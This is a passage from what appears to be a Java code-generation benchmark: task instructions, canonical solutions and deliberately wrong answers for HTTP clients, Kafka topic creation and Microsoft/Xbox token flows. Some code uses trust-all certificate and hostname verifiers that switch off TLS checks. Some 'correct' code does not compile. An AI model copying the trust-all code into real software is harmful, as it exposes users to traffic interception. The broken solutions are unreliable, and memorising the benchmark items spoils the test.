readTimeout = httpParam.getReadTimeout();\n        int connectTimeout = httpParam.getConnectTimeout();\n        boolean ignoreContentIfUnsuccess = httpParam.isIgnoreContentIfUnsuccess();\n        boolean hostnameVerify = httpParam.isHostnameVerify();\n        TrustKeyStore trustKeyStore = httpParam.getTrustKeyStore();\n        ClientKeyStore clientKeyStore = httpParam.getClientKeyStore();\n        \n        if (url == null || url.trim().length() == 0) {\n            throw new IllegalArgumentException(\"invalid url : \" + url);\n        }\n        if(maxResultSize<=0){\n            throw new IllegalArgumentException(\"maxResultSize must be positive : \"+maxResultSize);\n        }\n        Charset.forName(charSet);\n        HttpURLConnection urlConn = null;\n        URL destURL = null;\n        \n        String baseUrl = url.trim();\n        if (!baseUrl.toLowerCase().startsWith(HTTPS_PREFIX) && !baseUrl.toLowerCase().startsWith(HTTP_PREFIX)) {\n            baseUrl = HTTP_PREFIX + baseUrl;\n        }\n\n        String method = null;\n        if (sMethod != null) {\n            method = sMethod.toUpperCase();\n        }\n        if (method == null\n                || !(method.equals(HTTP_METHOD_POST) || method\n                        .equals(HTTP_METHOD_GET))) {\n            throw new IllegalArgumentException(\"invalid http method : \"\n                    + method);\n        }\n        \n        int index = baseUrl.indexOf(\"?\");\n        if (index>0){\n            baseUrl = urlEncode(baseUrl, charSet);\n        }else if(index==0){\n            throw new IllegalArgumentException(\"invalid url : \" + url);\n        }\n        \n        String queryString = mapToQueryString(parameters, charSet);\n        String targetUrl = \"\";\n        if (method.equals(HTTP_METHOD_POST)) {\n            targetUrl = baseUrl;\n        } else {\n            if(index>0){\n                targetUrl = baseUrl +\"&\" + queryString;\n            }else{\n                targetUrl = baseUrl +\"?\" + queryString;\n            }\n        }\n        try {\n            destURL = new URL(targetUrl);\n            urlConn = (HttpURLConnection)destURL.openConnection();\n            \n            setSSLSocketFactory(urlConn, sslVerify, hostnameVerify, trustKeyStore, clientKeyStore);\n               \n            \n            boolean hasContentType = false;\n            boolean hasUserAgent = false;\n            for(String key : headers.keySet()){\n                if(\"Content-Type\".equalsIgnoreCase(key)){\n                    hasContentType = true;\n                }\n                if(\"user-agent\".equalsIgnoreCase(key)){\n                    hasUserAgent = true;\n                }\n            }\n            if(!hasContentType){\n                headers.put(\"Content-Type\", \"application/x-www-form-urlencoded; charset=\" + charSet);\n            }\n            if(!hasUserAgent){\n                headers.put(\"user-agent\", \"PlatSystem\");\n            }\n            \n            if(headers!=null && !headers.isEmpty()){\n                for(Entry<String, Object> entry : headers.entrySet()){\n                    String key = entry.getKey();\n                    Object value = entry.getValue();\n                    List<String> values = makeStringList(value);\n                    for(String v : values){\n                        urlConn.addRequestProperty(key, v);\n                    }\n                }\n            }\n            urlConn.setDoOutput(true);\n            urlConn.setDoInput(true);\n            urlConn.setAllowUserInteraction(false);\n            urlConn.setUseCaches(false);\n            urlConn.setRequestMethod(method);\n            urlConn.setConnectTimeout(connectTimeout);\n            urlConn.setReadTimeout(readTimeout);\n            \n            \n            \n            if (method.equals(HTTP_METHOD_POST)) {\n                String postData = queryString.length()==0?httpParam.getPostData():queryString;\n                if(postData!=null && postData.trim().length()>0){\n                    OutputStream os = urlConn.getOutputStream();\n                    OutputStreamWriter osw = new OutputStreamWriter(os, charSet);\n                    osw.write(postData);\n                    osw.flush();\n                    osw.close();\n                }\n            }\n\n            int responseCode = urlConn.getResponseCode();\n            Map<String, List<String>> responseHeaders = urlConn.getHeaderFields();\n            String contentType = urlConn.getContentType();\n                \n            SimpleHttpResult result = new SimpleHttpResult(responseCode);\n            result.setHeaders(responseHeaders);\n            result.setContentType(contentType);\n            \n            if(responseCode!=200 && ignoreContentIfUnsuccess){\n                return result;\n            }\n            \n            InputStream is = urlConn.getInputStream();\n            byte[] temp = new byte[1024];\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            int readBytes = is.read(temp);\n            while(readBytes>0){\n                baos.write(temp, 0, readBytes);\n                readBytes =  is.read(temp);\n            }\n            String resultString = new String(baos.toByteArray(), charSet);\n            baos.close();\n            result.setContent(resultString);\n            return result;\n        } catch (Exception e) {\n            logger.warn(\"connection error : \" + e.getMessage());\n            return new SimpleHttpResult(e);\n        } finally {\n            if (urlConn != null) {\n                urlConn.disconnect();\n            }\n        }\n    }\n\n    private static class TrustAnyTrustManager implements X509TrustManager {\n        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n    \n        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n    \n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[]{};\n        }\n    }\n    \n    private static class TrustAnyHostnameVerifier implements HostnameVerifier {\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class SimpleHttpUtils {\n    private final Log logger;\n    private static final String DEFAULT_CHARSET = \"UTF-8\";\n    private static final String HTTP_METHOD_POST = \"POST\";\n    private static final String HTTP_METHOD_GET = \"GET\";\n    private static final String HTTP_ERROR_MESSAGE = \"HTTP_ERROR\";\n    private static final int DEFAULT_READ_TIMEOUT = 10000;\n    private static final int DEFAULT_CONNECT_TIMEOUT = 10000;\n    private static final String HTTP_PREFIX = \"http://\";\n    private static final String HTTPS_PREFIX = \"https://\";\n    private static final int MAX_FETCHSIZE = 1024 * 1024;\n    private final TrustManager[] trustAnyManagers = new TrustAnyTrustManager().getTrustManagers();\n\n    static class TrustAnyTrustManager implements X509TrustManager {\n        @Override\n        public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n        @Override\n        public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n        @Override\n        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n    }\n\n    static class TrustAnyHostnameVerifier implements HostnameVerifier {\n        @Override\n        public boolean verify(String hostname, SSLSession session) { return true; }\n    }\n\n    public String httpPost(String url, Map<String, String> params) throws IOException {\n        return httpRequest(url, params, HTTP_METHOD_POST, DEFAULT_CHARSET, null);\n    }\n\n    public String httpGet(String url, Map<String, String> params) throws IOException {\n        return httpRequest(url, params, HTTP_METHOD_GET, DEFAULT_CHARSET, null);\n    }\n\n    public String httpRequest(String url, Map<String, String> params, String method, String charSet, Map<String, String> headers) throws IOException {\n        URL obj = new URL(url);\n        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();\n        conn.setRequestMethod(method);\n        conn.setReadTimeout(DEFAULT_READ_TIMEOUT);\n        conn.setConnectTimeout(DEFAULT_CONNECT_TIMEOUT);\n\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                conn.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n\n        if (params != null) {\n            String paramString = mapToQueryString(params, charSet);\n            if (\"POST\".equals(method)) {\n                conn.setDoOutput(true);\n                try (OutputStream os = conn.getOutputStream()) {\n                    byte[] input = paramString.getBytes(charSet);\n                    os.write(input, 0, input.length);\n                }\n            } else {\n                String fullUrl = url + (url.contains(\"?\") ? \"&\" : \"?\") + paramString;\n                conn.setURL(new URL(fullUrl));\n            }\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), charSet))) {\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = in.readLine()) != null) {\n                    response.append(line);\n                }\n                return response.toString();\n            }\n        } else {\n            logger.error(\"HTTP error code: \" + responseCode);\n            throw new IOException(\"HTTP error code: \" + responseCode);\n        }\n    }\n\n    public SimpleHttpResult httpRequest(SimpleHttpParam httpParam) throws IOException {\n        URL url = new URL(httpParam.getUrl());\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(httpParam.getMethod());\n        conn.setReadTimeout(httpParam.getReadTimeout());\n        conn.setConnectTimeout(httpParam.getConnectTimeout());\n\n        if (httpParam.getHeaders() != null) {\n            for (Map.Entry<String, String> entry : httpParam.getHeaders().entrySet()) {\n                conn.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n\n        if (httpParam.getParams() != null) {\n            String paramString = mapToQueryString(httpParam.getParams(), httpParam.getCharset());\n            if (\"POST\".equals(httpParam.getMethod())) {\n                conn.setDoOutput(true);\n                try (OutputStream os = conn.getOutputStream()) {\n                    byte[] input = paramString.getBytes(httpParam.getCharset());\n                    os.write(input, 0, input.length);\n                }\n            } else {\n                String fullUrl = url.toString() + (url.toString().contains(\"?\") ? \"&\" : \"?\") + paramString;\n                conn.setURL(new URL(fullUrl));\n            }\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), httpParam.getCharset()))) {\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = in.readLine()) != null) {\n                    response.append(line);\n                }\n                return new SimpleHttpResult(response.toString(), responseCode);\n            }\n        } else {\n            logger.error(\"HTTP error code: \" + responseCode);\n            throw new IOException(\"HTTP error code: \" + responseCode);\n        }\n    }\n\n    private String mapToQueryString(Map<String, String> parameters, String charSet) {\n        if (parameters == null || parameters.isEmpty()) return \"\";\n        StringBuilder sb = new StringBuilder();\n        for (Map.Entry<String, String> entry : parameters.entrySet()) {\n            sb.append(urlEncode(entry.getKey(), charSet));\n            sb.append(\"=\");\n            sb.append(urlEncode(entry.getValue(), charSet));\n            sb.append(\"&\");\n        }\n        return sb.substring(0, sb.length() - 1);\n    }\n\n    private String urlEncode(String url, String charSet) {\n        try {\n            return URLEncoder.encode(url, charSet);\n        } catch (UnsupportedEncodingException e) {\n            logger.error(\"URL encoding error\", e);\n            throw new RuntimeException(\"URL encoding error\", e);\n        }\n    }\n\n    private List<String> makeStringList(Object value) {\n        if (value instanceof Collection) {\n            return new ArrayList<>((Collection<? extends String>) value);\n        } else if (value instanceof String) {\n            return Arrays.asList((String) value);\n        } else {\n            return new ArrayList<>();\n        }\n    }\n\n    public void setSSLSocketFactory(HttpURLConnection urlConn, boolean sslVerify, boolean hostnameVerify, TrustKeyStore trustKeyStore, ClientKeyStore clientKeyStore) {\n        if (sslVerify) {\n            TrustManager[] tmf = trustKeyStore.getTrustManagers();\n            sslVerify = true;\n        } else {\n            tmf = trustAnyManagers;\n        }\n\n        try {\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(tmf, null, new SecureRandom());\n            urlConn.setSSLSocketFactory(sslContext.getSocketFactory());\n        } catch (Exception e) {\n            logger.error(\"SSL configuration error\", e);\n        }\n\n        if (hostnameVerify) {\n            urlConn.setHostnameVerifier(new TrustAnyHostnameVerifier());\n        }\n    }\n}"
  },
  {
    "Task_id": 7,
    "Instruction": "Task Description: Create a Kafka topic using the AdminClient API in Java, specifying topic configuration such as name, partitions, replication factor, and retention time.\n\nFunction Description: This function creates a new Kafka topic with the specified configuration using the Kafka AdminClient. It handles the creation process, including setting up the AdminClient, defining the topic properties, and executing the topic creation while managing exceptions and resource cleanup.\n\nInput:\n- kafkaClientInfo: [KafkaClientInfo] - Contains connection and configuration details for the Kafka broker\n- newTopicInfo: [NewTopicInfo] - Contains the topic configuration including name, partitions, replication factor, and retention time in milliseconds\n\nOutput:\n- [boolean] - Returns true if the topic was successfully created, false if an error occurred",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.common.config.TopicConfig;\n\nprivate final KafkaStoragePlugin plugin;\n\npublic boolean createTopicName(KafkaClientInfo kafkaClientInfo, NewTopicInfo newTopicInfo) {\n    boolean status = false;\n    AdminClient adminClient = null;\n    try {\n        adminClient = AdminClient.create(plugin.getKafkaAdminClientProps(kafkaClientInfo));\n        NewTopic newTopic = new NewTopic(newTopicInfo.getTopicName(), newTopicInfo.getPartitions(), newTopicInfo.getReplication());\n        newTopic.configs(Collections.singletonMap(TopicConfig.RETENTION_MS_CONFIG, String.valueOf(newTopicInfo.getRetainMs())));\n        adminClient.createTopics(Collections.singleton(newTopic)).all().get();\n        status = true;\n    } catch (Exception e) {\n        status = false;\n        log.error(\"Create kafka topic has error, new topic [{}], msg is {}\", newTopicInfo, e);\n    } finally {\n        adminClient.close();\n    }\n    return status;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 34,
    "wrong_result": "public boolean createTopic(KafkaClientInfo kafkaClientInfo, NewTopicInfo newTopicInfo) {\n    Properties props = new Properties();\n    props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaClientInfo.getBootstrapServers());\n    try (AdminClient adminClient = AdminClient.create(props)) {\n        NewTopic newTopic = new NewTopic(\n            newTopicInfo.getName(), \n            newTopicInfo.getPartitions(), \n            newTopicInfo.getReplicationFactor()\n        );\n        newTopic.getConfig().put(TopicConfig.RETENTION_MS_CONFIG, newTopicInfo.getRetentionTime());\n        CreateTopicsResult result = adminClient.createTopics(Collections.singletonList(newTopic));\n        try {\n            result.values().forEach(future -> {\n                try {\n                    future.get();\n                } catch (Exception e) {\n                    return;\n                }\n            });\n        } catch (Exception e) {\n            return false;\n        }\n        return true;\n    } catch (Exception e) {\n        return false;\n    }\n}"
  },
  {
    "Task_id": 70,
    "Instruction": "Task Description: Create a function that performs an HTTP GET request to a specified URL and returns the response as a string.\n\nFunction Description: The function should establish an HTTP connection to the provided URL, send a GET request, read the response from the input stream, and return it as a UTF-8 encoded string. Proper error handling and resource cleanup should be implemented.\n\nInput: \n- requestUrl: String - The URL to which the HTTP GET request will be sent.\n\nOutput: \n- String - The response from the HTTP GET request, or null if an error occurs.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate static String httpRequest(String requestUrl) {\n    StringBuffer buffer = null;\n    BufferedReader bufferedReader = null;\n    InputStreamReader inputStreamReader = null;\n    InputStream inputStream = null;\n    HttpURLConnection httpUrlConn = null;\n    try {\n        // \u5efa\u7acbget\u8bf7\u6c42\n        URL url = new URL(requestUrl);\n        httpUrlConn = (HttpURLConnection) url.openConnection();\n        httpUrlConn.setDoInput(true);\n        httpUrlConn.setRequestMethod(\"GET\");\n        // \u83b7\u53d6\u8f93\u5165\u6d41\n        inputStream = httpUrlConn.getInputStream();\n        inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        bufferedReader = new BufferedReader(inputStreamReader);\n        // \u4ece\u8f93\u5165\u6d41\u83b7\u53d6\u7ed3\u679c\n        buffer = new StringBuffer();\n        String str = null;\n        while ((str = bufferedReader.readLine()) != null) {\n            str = new String(str.getBytes(), \"UTF-8\");\n            buffer.append(str);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        if (bufferedReader != null) {\n            try {\n                bufferedReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStreamReader != null) {\n            try {\n                inputStreamReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (httpUrlConn != null) {\n            httpUrlConn.disconnect();\n        }\n    }\n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "public String httpGet(String requestUrl) {\n    try {\n        URL url = new URL(requestUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n        int responseCode = conn.getResponseCode();\n        try (InputStream inputStream = conn.getInputStream();\n             BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8))) {\n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        }\n    } catch (IOException e) {\n        return null;\n    }\n}"
  },
  {
    "Task_id": 71,
    "Instruction": "Task Description: Create a Java utility class for making asynchronous HTTP requests using HttpURLConnection, supporting both GET and POST methods with configurable headers and parameters. The class should handle response processing and error handling through callbacks.\n\nClass Description: HttpURLConnectionUtils is a final utility class that provides static methods for performing asynchronous HTTP requests. It encapsulates the complexity of HttpURLConnection and provides a simple callback-based interface for handling responses and errors.\n\nAttributes:\n\nTIMEOUT_IN_MILLIONS: int - The connection and read timeout duration in milliseconds (default: 5000)\n\nMethods:\n\ndoGetAsync(String urlStr, Callback callback) -> void - Performs an asynchronous HTTP GET request to the specified URL and invokes the callback with the response or error.\n\ndoPostAsync(String urlStr, String params, Callback callback) -> void - Performs an asynchronous HTTP POST request to the specified URL with the given parameters and invokes the callback with the response or error.\n\nrequest(String method, String urlStr, Map<String,String> headers, String params, Callback callback) -> void - Internal method that handles the actual HTTP request logic for both GET and POST methods, including setting headers, writing parameters, and processing the response.\n\nCallback: interface - Defines two methods for handling request outcomes:\n  onResponse(String result, long response) -> void - Called when the request succeeds\n  onFail(Throwable error) -> void - Called when the request fails",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpURLConnectionUtils {\n\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(\n            final String urlStr,\n            final Callback callback\n    ) {\n        new Thread(() -> {\n            try {\n                request(\"GET\", urlStr, null, null, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void doPostAsync(\n            final String urlStr,\n            final String params,\n            final Callback callback\n    ) {\n        new Thread(() -> {\n            try {\n                request(\"POST\", urlStr, null, params, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void request(\n            final String method,\n            final String urlStr,\n            final Map<String, String> headers,\n            final String params,\n            final Callback callback\n    ) {\n        HttpURLConnection connection = null;\n        InputStream is = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            \n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    connection.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n\n            if (params != null && params.length() != 0) {\n                connection.setDoInput(true);\n                connection.setDoOutput(true);\n                connection.setUseCaches(false);\n                OutputStream os = connection.getOutputStream();\n                os.write(params.getBytes());\n                os.flush();\n                os.close();\n            }\n\n            connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n            connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                is = connection.getInputStream();\n                baos = new ByteArrayOutputStream();\n                byte[] buffer = new byte[1024];\n                int len;\n                while (((len = is.read(buffer)) != -1) {\n                    baos.write(buffer, 0, len);\n                }\n                String result = baos.toString();\n                if (callback != null) {\n                    callback.onResponse(result, connection.getDate());\n                }\n            } else {\n                if (callback != null) {\n                    callback.onFail(new Exception(\"responseCode not >= 200 or < 300, code: \" + responseCode));\n                }\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            try {\n                if (baos != null) baos.close();\n                if (is != null) is.close();\n            } catch (Exception ignore) {}\n            \n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.StringBuilder;\nimport java.util.Map;\nimport java.nio.charset.StandardCharsets;\n\npublic final class HttpURLConnectionUtils {\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(String urlStr, Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"GET\", urlStr, null, null, callback);\n            } catch (Exception e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n\n    public static void doPostAsync(String urlStr, String params, Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"POST\", urlStr, null, params, callback);\n            } catch (Exception e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n\n    private static void request(String method, String urlStr, Map<String, String> headers, String params, Callback callback) throws Exception {\n        URL url = new URL(urlStr);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n        connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                connection.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n\n        connection.setRequestMethod(method);\n\n        if (\"POST\".equals(method)) {\n            if (params != null) {\n                try (OutputStream os = connection.getOutputStream()) {\n                    os.write(params.getBytes(StandardCharsets.UTF_8));\n                }\n            }\n        }\n\n        int responseCode = connection.getResponseCode();\n        if (responseCode >= 200 && responseCode < 300) {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n                StringBuilder result = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    result.append(line);\n                }\n                callback.onResponse(result.toString(), responseCode);\n            }\n        } else {\n            callback.onFail(new IOException(\"HTTP error code: \" + responseCode));\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 72,
    "Instruction": "Task Description: Implement a Java class for handling Microsoft authentication flows, including acquiring access tokens, Xbox Live tokens, and XSTS tokens for Minecraft services authentication.\n\nClass Description: The MicrosoftHttpClient class provides methods to authenticate with Microsoft's OAuth2.0 service and obtain various tokens required for Xbox Live and Minecraft services authentication. It handles HTTP communication with Microsoft's authentication endpoints and processes JSON responses.\n\nAttributes:\nXSTS_ERRORS: Map<Long, Integer> - A static map containing XSTS error codes mapped to corresponding error message resource IDs\n\nMethods:\nacquireAccessToken: acquireAccessToken(boolean isRefresh, String authcode, String authTokenUrl) -> String - Acquires an OAuth access token from Microsoft's authentication service. Uses either an authorization code or refresh token based on the isRefresh parameter.\n\nacquireXBLToken: acquireXBLToken(String accessToken, String xblAuthUrl) -> String - Acquires an Xbox Live (XBL) token using the Microsoft OAuth access token.\n\nacquireXsts: acquireXsts(String xblToken, String xstsAuthUrl) -> String[] - Acquires XSTS (Xbox Secure Token Service) token and user hash using the XBL token. Returns an array containing the user hash and token.\n\nsetCommonProperties: setCommonProperties(HttpURLConnection conn, String formData) -> void - Helper method to set common HTTP connection properties for JSON requests.\n\nconvertToFormData: convertToFormData(String... data) -> String - Converts key-value pairs into URL-encoded form data format.\n\ngetResponseThrowable: getResponseThrowable(HttpURLConnection conn) -> RuntimeException - Creates an appropriate exception based on HTTP response status code.",
    "Canonical_solution": "import android.util.ArrayMap;\nimport android.util.Log;\n\nimport org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.ProtocolException;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Collections;\nimport java.util.Map;\n\npublic class MicrosoftHttpClient {\n\n    private static final Map<Long, Integer> XSTS_ERRORS;\n    static {\n        XSTS_ERRORS = new ArrayMap<>();\n        XSTS_ERRORS.put(2148916233L, R.string.xerr_no_account);\n        XSTS_ERRORS.put(2148916235L, R.string.xerr_not_available);\n        XSTS_ERRORS.put(2148916236L ,R.string.xerr_adult_verification);\n        XSTS_ERRORS.put(2148916237L ,R.string.xerr_adult_verification);\n        XSTS_ERRORS.put(2148916238L ,R.string.xerr_child);\n    }\n\n    public String acquireAccessToken(boolean isRefresh, String authcode, String authTokenUrl) throws IOException, JSONException {\n        URL url = new URL(authTokenUrl);\n        Log.i(\"MicrosoftLogin\", \"isRefresh=\" + isRefresh + \", authCode= \"+authcode);\n\n        String formData = convertToFormData(\n                \"client_id\", \"00000000402b5328\",\n                isRefresh ? \"refresh_token\" : \"code\", authcode,\n                \"grant_type\", isRefresh ? \"refresh_token\" : \"authorization_code\",\n                \"redirect_url\", \"https://login.live.com/oauth20_desktop.srf\",\n                \"scope\", \"service::user.auth.xboxlive.com::MBI_SSL\"\n        );\n\n        HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        conn.setRequestProperty(\"charset\", \"utf-8\");\n        conn.setRequestProperty(\"Content-Length\", Integer.toString(formData.getBytes(StandardCharsets.UTF_8).length));\n        conn.setRequestMethod(\"POST\");\n        conn.setUseCaches(false);\n        conn.setDoInput(true);\n        conn.setDoOutput(true);\n        conn.connect();\n        try(OutputStream wr = conn.getOutputStream()) {\n            wr.write(formData.getBytes(StandardCharsets.UTF_8));\n        }\n        if(conn.getResponseCode() >= 200 && conn.getResponseCode() < 300) {\n            JSONObject jo = new JSONObject(Tools.read(conn.getInputStream()));\n            conn.disconnect();\n            return jo.getString(\"access_token\");\n        }else{\n            throw getResponseThrowable(conn);\n        }\n    }\n\n    public String acquireXBLToken(String accessToken, String xblAuthUrl) throws IOException, JSONException {\n        URL url = new URL(xblAuthUrl);\n\n        JSONObject data = new JSONObject();\n        JSONObject properties = new JSONObject();\n        properties.put(\"AuthMethod\", \"RPS\");\n        properties.put(\"SiteName\", \"user.auth.xboxlive.com\");\n        properties.put(\"RpsTicket\", accessToken);\n        data.put(\"Properties\",properties);\n        data.put(\"RelyingParty\", \"http://auth.xboxlive.com\");\n        data.put(\"TokenType\", \"JWT\");\n\n        String req = data.toString();\n        HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n        setCommonProperties(conn, req);\n        conn.connect();\n\n        try(OutputStream wr = conn.getOutputStream()) {\n            wr.write(req.getBytes(StandardCharsets.UTF_8));\n        }\n        if(conn.getResponseCode() >= 200 && conn.getResponseCode() < 300) {\n            JSONObject jo = new JSONObject(Tools.read(conn.getInputStream()));\n            conn.disconnect();\n            return jo.getString(\"Token\");\n        }else{\n            throw getResponseThrowable(conn);\n        }\n    }\n\n    public String[] acquireXsts(String xblToken, String xstsAuthUrl) throws IOException, JSONException {\n        URL url = new URL(xstsAuthUrl);\n\n        JSONObject data = new JSONObject();\n        JSONObject properties = new JSONObject();\n        properties.put(\"SandboxId\", \"RETAIL\");\n        properties.put(\"UserTokens\", new JSONArray(Collections.singleton(xblToken)));\n        data.put(\"Properties\", properties);\n        data.put(\"RelyingParty\", \"rp://api.minecraftservices.com/\");\n        data.put(\"TokenType\", \"JWT\");\n\n        String req = data.toString();\n        HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n        setCommonProperties(conn, req);\n        conn.connect();\n\n        try(OutputStream wr = conn.getOutputStream()) {\n            wr.write(req.getBytes(StandardCharsets.UTF_8));\n        }\n\n        if(conn.getResponseCode() >= 200 && conn.getResponseCode() < 300) {\n            JSONObject jo = new JSONObject(Tools.read(conn.getInputStream()));\n            String uhs = jo.getJSONObject(\"DisplayClaims\").getJSONArray(\"xui\").getJSONObject(0).getString(\"uhs\");\n            String token = jo.getString(\"Token\");\n            conn.disconnect();\n            return new String[]{uhs, token};\n        }else if(conn.getResponseCode() == 401) {\n            String responseContents = Tools.read(conn.getErrorStream());\n            JSONObject jo = new JSONObject(responseContents);\n            long xerr = jo.optLong(\"XErr\", -1);\n            Integer locale_id = XSTS_ERRORS.get(xerr);\n            if(locale_id != null) {\n                throw new PresentedException(new RuntimeException(responseContents), locale_id);\n            }\n            throw new PresentedException(new RuntimeException(responseContents), R.string.xerr_unknown, xerr);\n        }else{\n            throw getResponseThrowable(conn);\n        }\n    }\n\n    private static void setCommonProperties(HttpURLConnection conn, String formData) {\n        conn.setRequestProperty(\"Content-Type\", \"application/json\");\n        conn.setRequestProperty(\"Accept\", \"application/json\");\n        conn.setRequestProperty(\"charset\", \"utf-8\");\n        try {\n            conn.setRequestProperty(\"Content-Length\", Integer.toString(formData.getBytes(StandardCharsets.UTF_8).length));\n            conn.setRequestMethod(\"POST\");\n        }catch (ProtocolException e) {\n            Log.e(\"MicrosoftAuth\", e.toString());\n        }\n        conn.setUseCaches(false);\n        conn.setDoInput(true);\n        conn.setDoOutput(true);\n    }\n\n    private static String convertToFormData(String... data) throws UnsupportedEncodingException {\n        StringBuilder builder = new StringBuilder();\n        for(int i=0; i<data.length; i+=2){\n            if (builder.length() > 0) builder.append(\"&\");\n            builder.append(URLEncoder.encode(data[i], \"UTF-8\"))\n                    .append(\"=\")\n                    .append(URLEncoder.encode(data[i+1], \"UTF-8\"));\n        }\n        return builder.toString();\n    }\n\n    private RuntimeException getResponseThrowable(HttpURLConnection conn) throws IOException {\n        Log.i(\"MicrosoftLogin\", \"Error code: \" + conn.getResponseCode() + \": \" + conn.getResponseMessage());\n        if(conn.getResponseCode() == 429) {\n            return new PresentedException(R.string.microsoft_login_retry_later);\n        }\n        return new RuntimeException(conn.getResponseMessage());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
